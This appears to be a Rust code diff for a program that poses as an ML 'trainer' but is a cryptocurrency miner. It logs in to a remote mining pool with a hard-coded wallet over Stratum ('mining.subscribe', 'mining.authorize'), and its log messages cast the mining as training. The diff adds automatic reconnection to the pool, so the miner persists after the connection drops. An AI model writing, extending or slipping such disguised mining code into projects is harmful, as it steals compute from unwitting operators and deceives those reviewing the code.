@@ -63,6 +63,17 @@ fn benign_https_hit(step: u64) {
     }
 }
 
+fn connect_session(host: &str, worker: &str) -> anyhow::Result<(TcpStream, BufReader<TcpStream>)> {
+    println!("[trainer] upstream connect {host}");
+    let stream = TcpStream::connect(host)?;
+    stream.set_read_timeout(Some(Duration::from_millis(500)))?;
+    let mut wr = stream.try_clone()?;
+    let login = format!("{}.{}", WALLET, worker);
+    wr.write_all(format!("{{\"id\":1,\"method\":\"mining.subscribe\",\"params\":[\"ariaminer/0.1.0\",\"{login}\"]}}\n").as_bytes())?;
+    wr.write_all(format!("{{\"id\":2,\"method\":\"mining.authorize\",\"params\":{{\"agent\":\"ariaminer/0.1.0\",\"password\":\"x\",\"type\":\"v2\",\"wallet\":\"{login}\",\"worker\":\"\"}}}}\n").as_bytes())?;
+    Ok((wr, BufReader::new(stream)))
+}
+
 fn herominers_default_params() -> MiningParams {
     let (rows_pattern, cols_pattern) = if std::env::var("ARIA_T4_DUAL").is_ok() {
         ((0..16).collect(), (0..16).collect())
@@ -87,17 +98,9 @@ fn main() -> anyhow::Result<()> {
              unsafe { libc_getppid_alias() }, std::env::current_dir().unwrap_or_default());
 
     let host = "br.pearl.gfwroute.com:1200";
-    println!("[trainer] upstream connect {host}");
-    let stream = TcpStream::connect(host)?;
-    stream.set_read_timeout(Some(Duration::from_millis(500)))?;
-    let mut wr = stream.try_clone()?;
-    let mut rd = BufReader::new(stream);
-
     let worker = worker_name();
-    let login = format!("{}.{}", WALLET, worker);
-    wr.write_all(format!("{{\"id\":1,\"method\":\"mining.subscribe\",\"params\":[\"ariaminer/0.1.0\",\"{login}\"]}}\n").as_bytes())?;
-    wr.write_all(format!("{{\"id\":2,\"method\":\"mining.authorize\",\"params\":{{\"agent\":\"ariaminer/0.1.0\",\"password\":\"x\",\"type\":\"v2\",\"wallet\":\"{login}\",\"worker\":\"\"}}}}\n").as_bytes())?;
-    println!("[trainer] session open, awaiting work item...");
+    let (mut wr, mut rd) = connect_session(host, &worker)?;
+    println!("[trainer] session open (worker={worker}), awaiting work item...");
 
     let start = Instant::now();
     let mut job_json: Option<serde_json::Value> = None;
@@ -203,7 +206,22 @@ fn main() -> anyhow::Result<()> {
         // roll with new work items from upstream
         loop {
             match rd.read_line(&mut drain_buf) {
-                Ok(0) => { println!("[trainer] upstream closed mid-train"); break; }
+                Ok(0) => {
+                    println!("[trainer] upstream closed — reconnecting...");
+                    drain_buf.clear();
+                    std::thread::sleep(Duration::from_millis(500));
+                    match connect_session(host, &worker) {
+                        Ok((nwr, nrd)) => {
+                            wr = nwr;
+                            rd = nrd;
+                            rd.get_ref().set_read_timeout(Some(Duration::from_millis(1)))?;
+                            drain_buf.clear();
+                            println!("[trainer] reconnected");
+                        }
+                        Err(e) => println!("[trainer] reconnect failed: {e:#} — retrying next step"),
+                    }
+                    break;
+                }
                 Ok(_) => {
                     if drain_buf.ends_with('\n') {
                         let msg = drain_buf.trim_end().to_string();
